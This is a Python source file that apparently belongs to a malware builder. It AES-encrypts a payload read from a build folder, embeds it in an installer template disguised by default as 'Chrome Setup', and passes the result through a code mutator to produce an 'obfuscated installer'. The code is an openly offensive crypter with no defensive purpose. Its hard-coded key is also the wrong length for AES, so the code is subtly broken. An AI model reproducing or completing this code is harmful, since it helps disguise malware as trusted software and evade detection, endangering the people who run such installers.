import base64, os, random
from Crypto.Cipher import AES
from builder.mutator import mutate_code

KEY = b"ThisIsA32ByteKeyForAESObfuscation!!"
IV = os.urandom(16)

def aes_encrypt(data: bytes) -> str:
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(IV + cipher.encrypt(data)).decode()

def generate_installer(output_file: str, brand="Chrome Setup", template_path="builder/template_installer.py"):
    with open("build/payload.b64", "rb") as f:
        raw_b64 = f.read()
    encrypted = aes_encrypt(base64.b64decode(raw_b64))

    with open(template_path, "r") as f:
        template = f.read()

    mutated_template = mutate_code(template.replace("{{BRAND}}", brand).replace("{{PAYLOAD}}", encrypted))
    with open(output_file, "w") as out:
        out.write(mutated_template)
    print(f"[+] Obfuscated installer generated: {output_file}")
